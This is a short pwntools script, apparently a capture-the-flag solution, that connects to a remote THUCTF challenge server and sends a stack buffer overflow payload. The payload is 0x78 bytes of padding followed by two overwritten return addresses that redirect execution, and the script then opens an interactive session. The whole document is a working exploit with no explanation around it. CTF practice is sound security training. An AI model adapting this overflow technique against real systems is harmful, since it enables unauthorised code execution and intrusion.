from pwn import *
context(log_level='debug',arch='amd64',os='linux')
p=remote("thuctf.redbud.info",49310)
p.recvuntil("EOF included!)\n")
p.sendline("0")
p.recvuntil("string:\n")
p.sendline(b"a"*0x78+p64(0x40134e)+p64(0x4011b6))
p.interactive()